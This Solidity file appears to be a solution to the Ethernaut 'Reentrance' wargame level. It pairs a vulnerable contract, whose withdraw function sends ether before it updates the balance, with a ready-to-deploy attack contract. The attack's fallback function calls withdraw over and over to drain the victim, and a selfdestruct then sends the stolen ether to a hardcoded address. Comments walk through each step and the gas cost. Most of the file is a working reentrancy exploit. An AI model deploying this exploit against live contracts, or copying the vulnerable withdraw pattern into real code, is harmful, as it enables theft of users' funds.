pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract ReentranceAttack {
    Reentrance victim;
    constructor() public payable{
        //payable is necessary so you can initialise the malicious contract with some ether to donate
        victim = Reentrance(0x7885390b278270f281d0922403aa020048d84f8a); //insert your victim contract's address here
    }

    function exploit() public {
        victim.donate.value(0.1 ether)(this);
        //first, you donate value to pass withdraw function's if condition "if(balances[msg.sender] >= _amount)"
        victim.withdraw(0.1 ether);
        // immediately withdraw the ether
        //the withdraw function will call the call.value(amount)() function
        //which will call THIS malicious contract's fallback function in an attempt to send money over
        // however, the fallback function calls the withdraw function again, making it recursive
        //ENSURE you have call this function with enough gas as it will recurse the withdraw-fallback loop, it will cost alot of gas
        //for 1.4 ether in the victim contract, this took 279795 gas 
    }
    

    function() public payable {
        victim.withdraw(0.1 ether);
    }
    
    function giveMeTheMoney(){
        selfdestruct(0x54151b3a0a41067dbcf66d3f677dd528e5bdd090);//insert your address here
    }
}